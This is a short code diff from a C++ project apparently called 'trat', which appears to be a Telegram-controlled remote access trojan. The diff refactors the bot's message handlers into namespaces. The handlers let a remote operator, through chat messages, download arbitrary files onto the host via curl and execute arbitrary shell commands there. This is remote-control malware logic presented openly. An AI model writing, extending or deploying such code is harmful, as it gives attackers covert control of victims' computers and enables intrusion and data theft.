@@ -1,3 +1,4 @@
+/* trat/src/Bot/handling.cpp */
 #include <cstring>
 #include "../../include/bot.hpp"
 #include "../../include/networking.hpp" //For curlDownload()
@@ -32,9 +33,9 @@ namespace trat
   }
   void Bot::handleDownloadCommand(const char* Telegram_Message_Text)
   {
-    if (auto link = extractDownloadLink(Telegram_Message_Text))
+    if (auto link = parser::extractDownloadLink(Telegram_Message_Text))
     {
-      auto networking_response = trat::curlDownload(link, constructFilePath(link));
+      auto networking_response = trat::networking::curlDownload(link, parser::constructFilePath(link));
       char message_buffer[256];
       if (networking_response.isSuccessful)
       {
@@ -48,7 +49,7 @@ namespace trat
   }
   void Bot::handleShellCommand(const char* Telegram_Message_Text)
   {
-    if (auto command = extractShellCommand(Telegram_Message_Text))
+    if (auto command = parser::extractShellCommand(Telegram_Message_Text))
     {
       auto command_result = this -> shell.executeShellCommand(command);
       if(command_result.isSuccessful)
